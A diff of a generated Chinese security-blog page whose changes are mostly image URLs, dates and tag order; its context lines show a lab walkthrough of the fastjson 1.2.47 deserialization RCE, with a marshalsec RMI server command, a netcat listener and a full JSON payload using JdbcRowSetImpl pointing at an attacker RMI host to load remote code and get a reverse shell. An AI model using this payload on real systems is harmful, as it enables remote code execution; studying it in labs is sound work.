@@ -15,16 +15,16 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="背景​    fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。其目前已经被广泛应用在各种场景中，包括cache存储、RPC通讯、MQ通讯、网络协议通讯、Android客户端、Ajax服务器处理程序等等。 ​    而在1.2.48以前的版本中，攻击者可以利用特殊构造的j">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-01-11_21-25-27.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-01-11_21-29-27.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-01-11_21-31-17.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-01-11_21-34-26.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-01-11_21-25-27.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-01-11_21-29-27.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-01-11_21-31-17.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-01-11_21-34-26.png">
 <meta property="article:published_time" content="2021-01-11T13:45:35.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.870Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:34.755Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="Fastjson">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.laohuan.art/Snipaste_2021-01-11_21-25-27.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/Snipaste_2021-01-11_21-25-27.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -42,7 +42,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -284,22 +284,22 @@
 <p><code>javac Exploit.java</code></p>
 <p>3.启动简单的http服务(和生成的Exploit.class在同一目录下)</p>
 <p><code>python3 -m http.server 80</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-01-11_21-25-27.png" alt></p>
-<p>4.借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务</p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-01-11_21-25-27.png" alt></p>
+<p>4.借助<a href="http://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务</p>
 <p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.0.108/#Exploit&quot; 8080</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-01-11_21-29-27.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-01-11_21-29-27.png" alt></p>
 <p>5.nc 开启监听</p>
 <p><code>nv -lvp 53</code></p>
 <p>6.使用bp发送如下payload</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.104:8090</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "b":&#123;</span><br><span class="line">        "@type":"com.sun.rowset.JdbcRowSetImpl",</span><br><span class="line">        "dataSourceName":"rmi://192.168.0.108:8080/Exploit",</span><br><span class="line">        "autoCommit":true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>注意rmi地址</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-01-11_21-31-17.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-01-11_21-31-17.png" alt></p>
 <p>7.回弹shell</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-01-11_21-34-26.png" alt></p>
-<h5><span id="fastjson检查脚本">fastjson检查脚本</span></h5><p><a href="https://github.com/mrknow001/fastjson_rec_exploit" target="_blank" rel="noopener">https://github.com/mrknow001/fastjson_rec_exploit</a></p>
-<h5><span id="参考链接">参考链接</span></h5><p><a href="https://www.cnblogs.com/lyh1/p/nul1.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyh1/p/nul1.html</a><br><a href="https://www.freesion.com/article/38861395538/" target="_blank" rel="noopener">https://www.freesion.com/article/38861395538/</a><br><a href="https://www.jianshu.com/p/e22c9dd4ed6d" target="_blank" rel="noopener">https://www.jianshu.com/p/e22c9dd4ed6d</a></p>
-<p><a href="https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce</a></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-01-11_21-34-26.png" alt></p>
+<h5><span id="fastjson检查脚本">fastjson检查脚本</span></h5><p><a href="http://github.com/mrknow001/fastjson_rec_exploit" target="_blank" rel="noopener">http://github.com/mrknow001/fastjson_rec_exploit</a></p>
+<h5><span id="参考链接">参考链接</span></h5><p><a href="http://www.cnblogs.com/lyh1/p/nul1.html" target="_blank" rel="noopener">http://www.cnblogs.com/lyh1/p/nul1.html</a><br><a href="http://www.freesion.com/article/38861395538/" target="_blank" rel="noopener">http://www.freesion.com/article/38861395538/</a><br><a href="http://www.jianshu.com/p/e22c9dd4ed6d" target="_blank" rel="noopener">http://www.jianshu.com/p/e22c9dd4ed6d</a></p>
+<p><a href="http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce" target="_blank" rel="noopener">http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce</a></p>
 
       
 
@@ -501,7 +501,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -621,6 +621,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -629,7 +633,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -637,7 +649,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -649,7 +661,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -657,7 +669,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -665,7 +677,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -681,6 +701,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -689,39 +713,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
